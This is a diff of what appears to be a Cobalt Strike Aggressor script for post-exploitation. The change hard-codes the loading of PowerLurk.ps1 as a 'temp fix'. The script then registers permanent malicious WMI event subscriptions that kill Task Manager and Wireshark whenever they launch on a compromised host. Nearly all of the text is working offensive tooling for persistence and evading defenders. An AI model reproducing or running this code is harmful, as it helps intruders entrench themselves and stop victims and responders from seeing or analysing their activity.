@@ -10,16 +10,17 @@
 
 sub sysinternalkiller {
 	
-	if (-exists script_resource("powerlurk.ps1")) {
-		$path = script_resource("powerlurk.ps1");
-		return $path;
-	}
-	else {
-		prompt_file_open("Select the PowerLurk.ps1 file on your system", $null, false, {
-			$path = $1;
-			return $path;
-		});
-	}
+	#temp fix
+	# if (-exists script_resource("powerlurk.ps1")) {
+	 	$path = script_resource("powerlurk.ps1");
+	# 	return $path;
+	# }
+	# else {
+	# 	prompt_file_open("Select the PowerLurk.ps1 file on your system", $null, false, {
+	# 		$path = $1;
+	# 		return $path;
+	# 	});
+	# }
 	bpowershell_import($1, $path);
 	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc1 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName taskmgr.exe');
 	bpowerpick($1, 'Register-MaliciousWmiEvent -EventName KillProc2 -PermanentCommand "powershell.exe -NoP -C `"Stop-Process -Id %ProcessId% -Force`"" -Trigger ProcessStart -ProcessName wireshark.exe');
